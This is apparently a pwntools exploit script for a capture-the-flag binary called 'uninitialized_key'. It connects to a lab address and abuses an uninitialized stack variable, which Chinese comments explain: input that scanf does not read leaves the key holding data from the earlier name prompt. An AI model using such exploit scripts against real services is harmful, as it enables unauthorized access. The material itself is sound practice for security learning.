from pwn import * 
from pwn import p64


debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./uninitialized_key")
    
else:
    host = "192.168.0.111:24154"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    # r = gdb.debug("./uninitialized_key",'b get_name')
    gdb.attach(r,'b get_key')
    # gdb.attach(r)
    pause()
    pass


# elf = ELF('./pwn')
#0x7ffd8a750454 name
#0x7ffd8a750454  key
r.sendlineafter(b'age:',b'114514')
#仔细看两个函数的栈变量相同，栈结构相同，当getname输入后，getkey使用的stack还是原来那个stack
#不让scanf读入数据即可使用getname的数据
r.sendlineafter(b'key:',b'\x00')

r.interactive()
